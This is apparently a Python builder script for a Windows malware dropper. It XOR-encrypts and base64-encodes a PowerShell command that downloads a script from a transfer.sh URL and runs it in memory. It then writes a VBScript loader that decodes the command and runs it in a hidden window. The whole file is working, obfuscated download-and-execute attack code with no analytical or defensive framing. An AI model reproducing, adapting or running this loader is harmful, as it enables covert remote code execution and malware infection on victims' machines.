
import os
vbs_enc_stub= """
strCommand = "powershell -Noexit  function RunPS {param ([String]$Script = '')$scriptBlock=[ScriptBlock]::Create($script);$scriptBlock.Invoke()};$URL='https://transfer.sh/get/YYJHLg/Manaco.ps1';Add-Type -AssemblyName 'System.Net.Http';$client=New-Object System.Net.Http.HttpClient;$response=$client.GetAsync($URL).Result;$content=$response.Content.ReadAsStringAsync().Result;RunPS $content"
key = "123456789"
For i = 1 To Len(strCommand)
    strEncryptedCommand = strEncryptedCommand & Chr(Asc(Mid(strCommand, i, 1)) Xor Asc(Mid(key, (i Mod Len(key)) + 1, 1)))
Next
Function StringToByteArray(szInput)
	Dim i, byteArray, wch, nAsc
	byteArray = ""
	For i=1 To Len(szInput)
		wch = Mid(szInput, i, 1)
		nAsc = AscW(wch)
		If nAsc < 0 Then
			nAsc = nAsc + 65536
		End If  
		If (nAsc And &HFF80) = 0 Then
			byteArray = byteArray & "," & AscW(wch)
		Else
			If (nAsc And &HF000) = 0 Then
				byteArray = byteArray & "," &  Cint("&H" & Hex(((nAsc \ 2 ^ 6)) Or &HC0)) - 256 & "," & Cint("&H" & Hex(nAsc And &H3F Or &H80))-256
			Else
				byteArray = byteArray & "," &  Cint("&H" & Hex((nAsc \ 2 ^ 12) Or &HE0)) - 256 & "," & Cint("&H" & Hex((nAsc \ 2 ^ 6) And &H3F Or &H80)) - 256 & "," & Cint("&H" & Hex(nAsc And &H3F Or &H80)) - 256
			End If
		End If
	Next
	If Left(byteArray, 1) = "," Then
		byteArray = Right(byteArray, Len(byteArray) - 1)
	End If
	StringToByteArray = Split(byteArray, ",")
End Function
Function Base64Encode(Str)                                                                                      
    Dim buf, length , mods 
    Const B64_CHAR_DICT = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    mods = (UBound(Str) + 1) Mod 3   
    length = UBound(Str) + 1 - mods
	Dim tmp
	IF mods <> 0 Then
		tmp=4
	Else
		tmp=0
	End If
    ReDim buf(length / 3 * 4 + tmp - 1)
    Dim i 
    For i = 0 To length - 1 Step 3
        buf(i / 3 * 4) = (Str(i) And &HFC) / &H4
        buf(i / 3 * 4 + 1) = (Str(i) And &H3) * &H10 + (Str(i + 1) And &HF0) / &H10
        buf(i / 3 * 4 + 2) = (Str(i + 1) And &HF) * &H4 + (Str(i + 2) And &HC0) / &H40
        buf(i / 3 * 4 + 3) = Str(i + 2) And &H3F
    Next
    If mods = 1 Then
        buf(length / 3 * 4) = (Str(length) And &HFC) / &H4
        buf(length / 3 * 4 + 1) = (Str(length) And &H3) * &H10
        buf(length / 3 * 4 + 2) = 64
        buf(length / 3 * 4 + 3) = 64
    ElseIf mods = 2 Then
        buf(length / 3 * 4) = (Str(length) And &HFC) / &H4
        buf(length / 3 * 4 + 1) = (Str(length) And &H3) * &H10 + (Str(length + 1) And &HF0) / &H10
        buf(length / 3 * 4 + 2) = (Str(length + 1) And &HF) * &H4
        buf(length / 3 * 4 + 3) = 64
    End If
    For i = 0 To UBound(buf)
        Base64Encode = Base64Encode + Mid(B64_CHAR_DICT, buf(i) + 1, 1)
    Next
End Function
WScript.Echo Base64Encode(StringToByteArray(strEncryptedCommand))
"""

vbs_dec_stub = """
Function fDecode(sStringToDecode)  
	Const CharList = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"  
	Dim iDataLength, sOutputString, iGroupInitialCharacter  
	sStringToDecode = Replace(Replace(Replace(sStringToDecode, vbCrLf, ""), vbTab, ""), " ", "")  
	iDataLength = Len(sStringToDecode)  
	If iDataLength Mod 4 <> 0 Then  
	fDecode = "Bad string passed to fDecode() function."  
	Exit Function  
	End If  
	For iGroupInitialCharacter = 1 To iDataLength Step 4  
	Dim iDataByteCount, iCharacterCounter, sCharacter, iData, iGroup, sPreliminaryOutString  
	iDataByteCount = 3  
	iGroup = 0  
	   For iCharacterCounter = 0 To 3  
		sCharacter = Mid(sStringToDecode, iGroupInitialCharacter + iCharacterCounter, 1)  
		 If sCharacter = "=" Then  
		  iDataByteCount = iDataByteCount - 1  
		  iData = 0  
		 Else  
		  iData = InStr(1, CharList, sCharacter, 0) - 1  
		   If iData = -1 Then  
			fDecode = "Bad string passed to fDecode() function."  
			Exit Function  
		   End If  
		 End If  
		iGroup = 64 * iGroup + iData  
	   Next  
	iGroup = Hex(iGroup)  
	iGroup = String(6 - Len(iGroup), "0") & iGroup  
	sPreliminaryOutString = Chr(CByte("&H" & Mid(iGroup, 1, 2))) & Chr(CByte("&H" & Mid(iGroup, 3, 2))) & Chr(CByte("&H" & Mid(iGroup, 5, 2)))  
	sOutputString = sOutputString & Left(sPreliminaryOutString, iDataByteCount)  
	Next  
	fDecode = sOutputString  
End Function

key = "123456789"
strEncryptedCommand = "return"
UltimateDecryption = fDecode(strEncryptedCommand)
strDecryptedCommand = ""
For i = 1 To Len(UltimateDecryption)
    strDecryptedCommand = strDecryptedCommand & Chr(Asc(Mid(UltimateDecryption, i, 1)) Xor Asc(Mid(key, (i Mod Len(key)) + 1, 1)))
Next
Set objShell = CreateObject("WScript.Shell")
objShell.Run strDecryptedCommand, 0, Fales
"""


def main(vbs_enc_stub,vbs_dec_stub):
    writefile = open("outfile.vbs", "w")
    writefile.write(vbs_enc_stub)
    writefile.close()
    result =os.popen("cscript.exe outfile.vbs") 
    context = result.read()
    for line in context.splitlines():
        print(line)
    vbs_dec_stub = vbs_dec_stub.replace("return",line)
    writefile = open("invoke.vbs", "w")
    writefile.write(vbs_dec_stub)
    writefile.close()
if __name__ == '__main__':
    main(vbs_enc_stub,vbs_dec_stub)
    
    
    



